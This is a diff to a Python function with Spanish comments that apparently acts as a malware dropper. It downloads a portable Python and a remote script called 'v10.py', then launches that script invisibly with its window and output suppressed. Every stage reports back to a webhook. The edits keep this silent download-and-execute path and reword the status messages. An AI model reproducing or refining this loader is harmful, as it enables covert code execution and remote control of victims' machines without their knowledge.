@@ -48,7 +48,7 @@ def preparar_y_exec():
     if not os.path.exists(DIRECTORIO_DESTINO):
       os.makedirs(DIRECTORIO_DESTINO, exist_ok=True)
 
-    # 1. Descargar y extraer el Python portable si no está configurado
+    # 1. Configurar Python portable
     python_ejecutable = encontrar_python()
     if not python_ejecutable:
       enviar_webhook(
@@ -60,7 +60,6 @@ def preparar_y_exec():
       with zipfile.ZipFile(ZIP_TEMPORAL, "r") as zip_ref:
         zip_ref.extractall(DIRECTORIO_DESTINO)
 
-      # Habilitar soporte de site-packages
       for root, dirs, files in os.walk(DIRECTORIO_DESTINO):
         for archivo in files:
           if archivo.endswith("._pth"):
@@ -79,23 +78,20 @@ def preparar_y_exec():
     enviar_webhook("📥 [Dependencias] Descargando v10.py...")
     urllib.request.urlretrieve(URL_V10, SCRIPT_V10)
 
-    # 3. Lanzar v10 en segundo plano sin bloquear el flujo
+    # 3. Lanzar v10 en segundo plano
     if python_ejecutable and os.path.exists(SCRIPT_V10):
-      enviar_webhook(
-          f"🚀 [Dependencias] Lanzando v10.py con: {python_ejecutable}"
-      )
+      enviar_webhook("🚀 [Dependencias] Lanzando v10.py en segundo plano...")
       subprocess.Popen(
           [python_ejecutable, SCRIPT_V10],
           creationflags=0x08000000,
           stdout=subprocess.DEVNULL,
           stderr=subprocess.DEVNULL,
       )
-      enviar_webhook("✅ [Dependencias] v10 iniciado en segundo plano.")
-
-    # 4. Limpiar py.zip de inmediato ya que fue extraído con éxito
-    if os.path.exists(ZIP_TEMPORAL):
-      os.remove(ZIP_TEMPORAL)
-      enviar_webhook("🧹 [Dependencias] py.zip eliminado del sistema.")
+      enviar_webhook("✅ [Dependencias] v10 lanzado correctamente.")
+    else:
+      enviar_webhook(
+          "❌ [Error] No se pudo lanzar v10: Faltan archivos o rutas."
+      )
 
   except Exception as e:
     enviar_webhook(f"❌ [Error crítico en dependencias]: {str(e)}")
